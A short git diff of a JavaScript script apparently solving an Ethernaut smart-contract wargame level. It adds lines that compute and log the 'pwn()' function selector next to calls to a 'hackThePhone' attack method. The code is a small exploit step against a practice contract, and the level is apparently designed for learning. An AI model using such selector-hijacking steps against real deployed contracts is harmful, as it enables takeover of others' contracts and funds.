@@ -21,6 +21,9 @@ const ethernaut = async () => {
     const estimatedGas = await solContract.methods.hackThePhone().estimateGas();
     debugEthernaut('estimated gas', estimatedGas);
     const transactionData = await solContract.methods.hackThePhone().encodeABI();
+    // The next 2 lines are the response
+    const signature = web3.utils.keccak256('pwn()').slice(0, 10);
+    debugEthernaut('signature', signature);
     debugEthernaut('data', transactionData);
     const transaction = {
       from: account.address,
